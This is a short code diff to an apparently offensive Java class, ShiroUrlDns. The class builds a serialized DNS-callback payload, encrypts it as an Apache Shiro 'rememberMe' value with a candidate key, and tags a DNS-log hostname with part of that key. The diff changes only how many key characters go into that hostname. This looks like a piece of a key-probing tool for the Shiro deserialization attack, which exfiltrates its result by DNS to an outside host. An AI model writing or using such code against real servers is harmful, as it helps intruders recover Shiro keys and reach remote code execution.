@@ -36,7 +36,7 @@ public class ShiroUrlDns {
     }
 
     private void init(String key, String dnsLogUrl) throws Exception {
-        String sendDnsLogUrl = key.substring(0, 2) + "." + this.randomStr(8) + "." + dnsLogUrl;
+        String sendDnsLogUrl = key.substring(0, 1) + "." + this.randomStr(8) + "." + dnsLogUrl;
 
         byte[] bytes = this.makeDNSURL(sendDnsLogUrl);
         String rememberMe = this.shiroRememberMeEncrypt(key, bytes);
